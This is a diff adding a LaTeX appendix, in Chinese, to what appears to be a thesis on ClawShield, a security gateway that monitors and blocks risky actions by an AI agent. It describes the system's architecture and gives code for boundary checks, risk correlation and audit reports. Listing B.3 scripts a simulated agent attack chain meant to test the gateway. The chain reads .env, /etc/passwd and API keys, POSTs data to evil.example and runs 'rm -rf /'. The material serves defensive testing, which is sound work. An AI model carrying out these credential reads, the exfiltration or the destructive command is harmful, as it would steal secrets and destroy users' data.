@@ -1,0 +1,166 @@
+% -*- coding=utf-8 -*-
+\chapter{附录}
+
+\section*{A. Demo系统结构}
+\addcontentsline{toc}{section}{A. Demo系统结构}
+\label{sec:demo_architecture}
+
+本附录展示了 ClawShield Demo 的整体架构与核心执行链路。系统采用“统一安全网关 + 规则引擎 + 运行时观测 + 报告生成”的闭环设计，覆盖任务执行前、执行中与执行后。
+
+\subsubsection*{(1) 分层架构}
+系统按职责分为五层：
+\begin{itemize}
+  \item 展示层：Web 页面用于触发场景、查看运行详情与审计报告；
+  \item 服务编排层：负责 run 生命周期管理与场景执行分发；
+  \item 安全控制层：统一网关进行文件/工具/网络/命令/环境变量访问控制；
+  \item 分析与观测层：事件记录、调用链构建、风险关联分析；
+  \item 持久化与导出层：数据库存储与 HTML 审计报告导出。
+\end{itemize}
+
+\subsubsection*{(2) 核心执行流程}
+一次任务执行的关键路径如下：
+\begin{enumerate}
+  \item 创建 run 并选择场景；
+  \item 所有高风险动作统一进入 SecurityGateway；
+  \item BoundaryEngine 返回 allow/alert/block 决策；
+  \item RuntimeMonitor 记录 pre-check 与 execution-result 事件；
+  \item RiskEngine 聚合单点规则与关联规则（如 R7/R8/R10/R11）；
+  \item TraceBuilder 构建 run-skill-tool-resource 调用图；
+  \item ReportEngine 输出可解释证据文本与审计报告。
+\end{enumerate}
+
+\section*{B. 关键代码}
+\addcontentsline{toc}{section}{B. 关键代码}
+\label{sec:demo_core_code}
+
+\setcounter{listing}{0}
+\renewcommand{\thelisting}{B.\arabic{listing}}
+
+\subsubsection{(1) 统一安全接管网关（SecurityGateway）}
+
+\begin{listing}[htbp]
+\caption{统一安全网关核心逻辑：预检查、执行与事件记录}
+\label{lst:demo_gateway_core}
+\begin{minted}[escapeinside=||]{python}
+class SecurityGateway:
+    def read_file(self, ctx: ExecutionContext, path: str) -> GatewayResponse:
+        bd = self.boundary.check_file_access(path=path, action="read")
+        pre_id = self._record_precheck(
+            ctx, action="file_read", resource_type="file", resource=path,
+            decision=bd.decision, severity=bd.severity, message=bd.message, tags=bd.tags
+        )
+        if bd.decision == "block":
+            end_id = self._record_result(
+                ctx, pre_id, action="file_read", resource_type="file", resource=path,
+                decision=bd.decision, result_status="blocked",
+                severity=bd.severity, message=bd.message, tags=bd.tags
+            )
+            return self._build_response(bd.decision, bd.message, {}, [pre_id, end_id])
+
+        content = self.file_adapter.read(path)
+        end_id = self._record_result(
+            ctx, pre_id, action="file_read", resource_type="file", resource=path,
+            decision=bd.decision, result_status="ok",
+            severity=bd.severity, message="File read completed", tags=bd.tags
+        )
+        return self._build_response(bd.decision, bd.message, {"content": content}, [pre_id, end_id])
+
+    def invoke_tool(self, ctx: ExecutionContext, tool_id: str, payload: dict) -> GatewayResponse:
+        trust = self.boundary.check_trust(skill_source=ctx.metadata.get("skill_source"), tool_id=tool_id)
+        bd = self.boundary.check_tool_invocation(tool_id=tool_id)
+        decision = "alert" if (trust.decision == "alert" and bd.decision == "allow") else bd.decision
+        ...
+\end{minted}
+\end{listing}
+
+\subsubsection{(2) 边界判定与关联风险分析}
+
+\begin{listing}[htbp]
+\caption{边界引擎与风险引擎：规则判定与多事件关联}
+\label{lst:demo_boundary_risk_core}
+\begin{minted}[escapeinside=||]{python}
+class BoundaryEngine:
+    def check_file_access(self, path: str, action: str) -> BoundaryDecision:
+        if self._is_blocked_path(path) or self._is_outside_workspace(path):
+            return BoundaryDecision("block", "high", "Path is outside workspace", "R1", ["workspace_escape"])
+        if self._is_sensitive_path(path):
+            return BoundaryDecision("alert", "medium", "Sensitive file access detected", "R2", ["sensitive"])
+        return BoundaryDecision("allow", "low", f"{action} allowed")
+
+class RiskEngine:
+    def evaluate_run_correlations(self, run_id: str) -> list[dict]:
+        findings = []
+        findings.extend(self._detect_sensitive_read_then_http(run_id))
+        findings.extend(self._detect_unauthorized_tool_then_command(run_id))
+        findings.extend(self._detect_high_frequency_probe(run_id, threshold=4, window_sec=20))
+        findings.extend(self._detect_untrusted_skill_high_risk_tool(run_id))
+        return findings
+\end{minted}
+\end{listing}
+
+\subsubsection{(3) 高危复杂场景编排（Advanced Intrusion Kill Chain）}
+
+\begin{listing}[htbp]
+\caption{复杂攻击链场景：多阶段高风险行为编排}
+\label{lst:demo_advanced_scenario}
+\begin{minted}[escapeinside=||]{python}
+def run_advanced_intrusion_kill_chain(self, run_id: str) -> list[dict]:
+    ctx = ExecutionContext(
+        run_id=run_id,
+        task_id="task_advanced_intrusion",
+        skill_id="supply_chain_plugin",
+        actor="openclaw",
+        metadata={"skill_source": "unknown"},
+    )
+    results = []
+
+    results.append(self.gateway.read_file(ctx, "docs/brief.txt").model_dump())
+    results.append(self.gateway.read_file(ctx, "../../.env").model_dump())
+    results.append(self.gateway.read_file(ctx, "/etc/passwd").model_dump())
+
+    for path in [".env", "config/secret.yml", "vault_secret.txt", ".env"]:
+        results.append(self.gateway.read_file(ctx, path).model_dump())
+
+    results.append(self.gateway.read_env(ctx, "OPENAI_API_KEY").model_dump())
+    results.append(self.gateway.invoke_tool(
+        ctx.model_copy(update={"tool_id": "data_exporter"}),
+        "data_exporter", {"target": "credentials_dump", "mode": "batch"}
+    ).model_dump())
+    results.append(self.gateway.http_request(
+        ctx, method="POST", url="https://evil.example/upload",
+        payload={"data": "simulated-sensitive-payload"}
+    ).model_dump())
+    results.append(self.gateway.exec_command(ctx, "rm -rf /").model_dump())
+    return results
+\end{minted}
+\end{listing}
+
+\subsubsection{(4) 调用链构建与可解释报告生成}
+
+\begin{listing}[H]
+\caption{调用链图与审计报告：从事件到证据文本}
+\label{lst:demo_trace_report}
+\begin{minted}[escapeinside=||]{python}
+class TraceBuilder:
+    def build(self, run_id: str) -> dict:
+        events = self._load_events(run_id)
+        nodes, edges, risk_paths = [], [], []
+        run_node = f"run:{run_id}"
+        ...
+        return {"run_id": run_id, "nodes": nodes, "edges": edges, "risk_paths": risk_paths}
+
+class ReportEngine:
+    def generate(self, run_id: str, overall_risk_level: str, findings: list[dict], trace_graph: dict):
+        summary = {
+            "run_id": run_id,
+            "event_count": len(self._load_events(run_id)),
+            "risk_count": len(findings),
+            "findings": findings,
+        }
+        evidence_text = "；".join([
+            f"命中规则 {f['rule_id']}，严重级别 {f.get('severity', 'medium')}：{f.get('message', '')}"
+            for f in findings
+        ]) if findings else f"任务 {run_id} 未发现高风险行为。"
+        return self._persist_and_export(run_id, overall_risk_level, summary, trace_graph, evidence_text)
+\end{minted}
+\end{listing}
